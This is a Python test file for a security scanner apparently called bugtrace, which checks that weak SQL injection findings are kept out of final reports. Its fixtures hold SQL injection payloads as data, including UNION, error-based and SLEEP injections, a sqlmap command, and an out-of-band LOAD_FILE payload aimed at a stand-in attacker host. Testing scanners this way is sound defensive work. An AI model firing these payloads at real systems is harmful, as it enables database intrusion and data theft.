#!/usr/bin/env python3
"""
SQLi False Positive Regression Tests

Validates that the hardening fixes prevent weak SQLi signals from reaching the final report:

1. meets_report_quality() filters weak SQLi findings
2. Status differential without DB fingerprint marked as PENDING_VALIDATION
3. SQLiFinding defaults to MEDIUM severity instead of CRITICAL

Test Coverage:
- Status differential without fingerprint → manual_review (quality gate rejects)
- SQLMap confirmed → reported (quality gate accepts)
- Data extracted → reported 
- OOB callback → reported
- Solid error + DB identified → reported (not just status diff)
- Weak boolean → manual_review
- Default severity validation
"""

import pytest
import sys
from pathlib import Path
from dataclasses import asdict

# Add bugtrace to path
sys.path.insert(0, str(Path(__file__).parent.parent))

from bugtrace.agents.sqli.types import SQLiFinding
from bugtrace.agents.reporting_mod.finding_processor import meets_report_quality
from bugtrace.agents.reporting import ReportingAgent


class TestSQLiQualityGate:
    """Tests for SQLi quality gate in reporting pipeline."""

    def test_status_differential_without_fingerprint_rejected(self):
        """
        Test Case: Status code change (2xx→4xx) with SQL keyword, but NO DB fingerprint.
        Expected: meets_report_quality() returns False (routes to manual_review)
        This prevents false positives from generic error pages with SQL terms.
        """
        finding = {
            "type": "SQLI",
            "url": "http://target.com/search?q=test",
            "parameter": "q",
            "payload": "' OR '1'='1",
            "severity": "MEDIUM",
            "status": "PENDING_VALIDATION",
            "evidence": {
                "level": "L1",
                "status_differential": {"baseline": 200, "payload": 500},
                "db_type": "unknown",  # No fingerprint found
            },
            "dbms_detected": "unknown",  # Critical: Not identified
            "validation_method": "status_differential",
        }
        
        result = meets_report_quality(finding)
        assert result is False, (
            "Status differential without DB fingerprint should be rejected by quality gate"
        )

    def test_sqlmap_confirmed_accepted(self):
        """
        Test Case: SQLMap confirmed exploitation.
        Expected: meets_report_quality() returns True (included in report)
        """
        finding = {
            "type": "SQLI",
            "url": "http://target.com/api/user?id=1",
            "parameter": "id",
            "payload": "1' UNION SELECT NULL,NULL,NULL--",
            "severity": "CRITICAL",
            "status": "VALIDATED_CONFIRMED",
            "evidence": {
                "level": "L4",
                "sqlmap_confirmed": True,  # Strong evidence
                "sqlmap_command": "sqlmap -u 'http://target.com/api/user?id=1' -p id --batch",
            },
            "dbms_detected": "MySQL",
            "validation_method": "sqlmap",
        }
        
        result = meets_report_quality(finding)
        assert result is True, "SQLMap confirmed findings should pass quality gate"

    def test_data_extracted_accepted(self):
        """
        Test Case: Data exfiltration evidenced by extracted databases/tables.
        Expected: meets_report_quality() returns True
        """
        finding = {
            "type": "SQLI",
            "url": "http://target.com/search?name=test",
            "parameter": "name",
            "payload": "admin' UNION SELECT table_name FROM information_schema.tables--",
            "severity": "CRITICAL",
            "status": "VALIDATED_CONFIRMED",
            "evidence": {
                "level": "L2",
                "data_extracted": True,
            },
            "extracted_databases": ["information_schema", "mysql", "test"],
            "extracted_tables": ["users", "products", "orders"],
            "dbms_detected": "MySQL",
            "validation_method": "union_based",
        }
        
        result = meets_report_quality(finding)
        assert result is True, "Findings with extracted data should pass quality gate"

    def test_oob_callback_accepted(self):
        """
        Test Case: Out-of-band exfiltration via DNS/HTTP callback.
        Expected: meets_report_quality() returns True (very strong evidence)
        """
        finding = {
            "type": "SQLI",
            "url": "http://target.com/product?id=1",
            "parameter": "id",
            "payload": "1' AND LOAD_FILE('\\\\\\\\attacker-server.com\\\\flag')--",
            "severity": "CRITICAL",
            "status": "VALIDATED_CONFIRMED",
            "evidence": {
                "level": "L3",
                "oob_callback_received": True,
                "oob_callback_time": 1234567890,
                "oob_exfiltrated_data": "admin|password123|attacker@test.com",
            },
            "dbms_detected": "MySQL",
            "validation_method": "oob",
        }
        
        result = meets_report_quality(finding)
        assert result is True, "OOB callback confirms real exploitation, should pass"

    def test_solid_error_with_db_identified_accepted(self):
        """
        Test Case: Error-based SQLi with confirmed database type (not just status diff).
        Expected: meets_report_quality() returns True
        """
        finding = {
            "type": "SQLI",
            "url": "http://target.com/login?user=test",
            "parameter": "user",
            "payload": "admin' AND extractvalue(1,concat(0x7e,(SELECT version())))--",
            "severity": "HIGH",
            "status": "PENDING_VALIDATION",
            "evidence": {
                "level": "L1",
                "db_fingerprints": ["MySQL 5.7.25"],
                "error_message": "~5.7.25-0ubuntu0.18.04.1",
            },
            "dbms_detected": "MySQL",
            "validation_method": "error_based",
        }
        
        result = meets_report_quality(finding)
        assert result is True, (
            "Error-based with confirmed DB type should pass quality gate"
        )

    def test_weak_boolean_without_verification_rejected(self):
        """
        Test Case: Boolean-based SQLi without HIGH/MAXIMUM confidence.
        Expected: meets_report_quality() returns False
        """
        finding = {
            "type": "SQLI",
            "url": "http://target.com/search?q=test",
            "parameter": "q",
            "payload": "1 AND 1=1",
            "severity": "MEDIUM",
            "status": "PENDING_VALIDATION",
            "evidence": {
                "level": "L2",
                "boolean_confidence": "LOW",  # Weak signal
                "response_sizes": {
                    "true_response_size": 1234,
                    "false_response_size": 1233,  # Minimal difference
                },
            },
            "dbms_detected": "unknown",
            "validation_method": "boolean_based",
        }
        
        result = meets_report_quality(finding)
        assert result is False, (
            "Weak boolean confidence without HIGH/MAXIMUM should be rejected"
        )

    def test_high_confidence_boolean_accepted(self):
        """
        Test Case: Boolean-based SQLi with HIGH confidence.
        Expected: meets_report_quality() returns True
        """
        finding = {
            "type": "SQLI",
            "url": "http://target.com/filter?cat=1",
            "parameter": "cat",
            "payload": "1 AND 1=1",
            "severity": "MEDIUM",
            "status": "PENDING_VALIDATION",
            "evidence": {
                "level": "L2",
                "boolean_confidence": "HIGH",  # Strong signal
                "response_sizes": {
                    "true_response_size": 2500,
                    "false_response_size": 1200,  # Significant difference
                },
            },
            "dbms_detected": "unknown",
            "validation_method": "boolean_based",
        }
        
        result = meets_report_quality(finding)
        assert result is True, "HIGH confidence boolean should pass quality gate"

    def test_time_based_with_triple_verification_accepted(self):
        """
        Test Case: Time-based SQLi with triple verification.
        Expected: meets_report_quality() returns True
        """
        finding = {
            "type": "SQLI",
            "url": "http://target.com/api/data?id=1",
            "parameter": "id",
            "payload": "1' AND SLEEP(5)--",
            "severity": "MEDIUM",
            "status": "PENDING_VALIDATION",
            "evidence": {
                "level": "L3",
                "time_based_triple_verified": True,
                "response_times": [5.1, 5.2, 5.0],  # Multiple confirmations
            },
            "dbms_detected": "unknown",
            "validation_method": "time_based",
        }
        
        result = meets_report_quality(finding)
        assert result is True, (
            "Time-based with triple verification should pass quality gate"
        )

    def test_time_based_without_verification_rejected(self):
        """
        Test Case: Single time-based test without verification.
        Expected: meets_report_quality() returns False
        """
        finding = {
            "type": "SQLI",
            "url": "http://target.com/search?term=test",
            "parameter": "term",
            "payload": "1' AND SLEEP(3)--",
            "severity": "MEDIUM",
            "status": "PENDING_VALIDATION",
            "evidence": {
                "level": "L3",
                "time_based_triple_verified": False,  # Not verified
                "response_times": [3.1],  # Single measure
            },
            "dbms_detected": "unknown",
            "validation_method": "time_based",
        }
        
        result = meets_report_quality(finding)
        assert result is False, (
            "Time-based without triple verification should be rejected"
        )


class TestSQLiFindingDefaults:
    """Tests for SQLiFinding dataclass default values."""

    def test_default_severity_is_medium(self):
        """
        Test Case: New SQLiFinding should default to MEDIUM severity, not CRITICAL.
        Expected: severity = "MEDIUM"
        Purpose: Conservative default prevents false positives from inflating severity
        """
        finding = SQLiFinding(
            url="http://target.com/search?q=test",
            parameter="q",
        )
        
        assert finding.severity == "MEDIUM", (
            f"SQLiFinding should default to MEDIUM severity, got {finding.severity}"
        )

    def test_default_status_is_pending_validation(self):
        """
        Test Case: New SQLiFinding should default to PENDING_VALIDATION status.
        Expected: status = "PENDING_VALIDATION"
        """
        finding = SQLiFinding(
            url="http://target.com/api/user?id=1",
            parameter="id",
        )
        
        assert finding.status == "PENDING_VALIDATION", (
            f"SQLiFinding should default to PENDING_VALIDATION, got {finding.status}"
        )

    def test_severity_override_works(self):
        """
        Test Case: Severity can be overridden when creating finding.
        Expected: Should set to provided value
        """
        finding = SQLiFinding(
            url="http://target.com/api",
            parameter="id",
            severity="CRITICAL",  # Explicitly set
        )
        
        assert finding.severity == "CRITICAL", (
            "Should respect explicitly set severity"
        )


class TestStatusDifferentialHardening:
    """Tests for status_differential path hardening in exploitation."""

    def test_status_differential_rejects_weak_signal(self):
        """
        Test Case: Status differential without DB fingerprint should be filtered.
        Expected: meets_report_quality() returns False

        This validates the hardening in exploitation.py where we set:
            finding.status = "PENDING_VALIDATION"
            finding.severity = "MEDIUM"
        """
        finding = {
            "type": "SQLI",
            "url": "http://target.com/search?q=test",
            "parameter": "q",
            "payload": "' OR '1'='1",
            "status": "PENDING_VALIDATION",
            "severity": "MEDIUM",
            "dbms_detected": "unknown",
            "evidence": {
                "level": "L1",
                "status_differential": {"baseline": 200, "payload": 500},
                "detection_method": "status_differential",
            },
        }
        
        result = meets_report_quality(finding)
        assert result is False, (
            "Status differential with PENDING_VALIDATION and MEDIUM severity should be rejected"
        )


class TestReportingAgentQualityGate:
    """Tests for legacy ReportingAgent._meets_report_quality() method."""

    def test_reporting_agent_legacy_still_filters(self):
        """
        Test Case: Legacy ReportingAgent module has the same quality gate logic.
        Expected: The _meets_report_quality() method exists and has SQLi filtering.
        
        Note: Both reporting.py and reporting_mod/ now have identical SQLi quality 
        gate logic added, ensuring consistent filtering regardless of which agent is used.
        """
        import inspect
        from bugtrace.agents.reporting import ReportingAgent
        
        # Verify the method exists
        assert hasattr(ReportingAgent, "_meets_report_quality"), (
            "ReportingAgent should have _meets_report_quality method"
        )
        
        # Verify it mentions SQLI in the source (for SQLi filtering)
        source = inspect.getsource(ReportingAgent._meets_report_quality)
        assert "SQLI" in source, (
            "ReportingAgent._meets_report_quality should have SQLi filtering logic"
        )


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
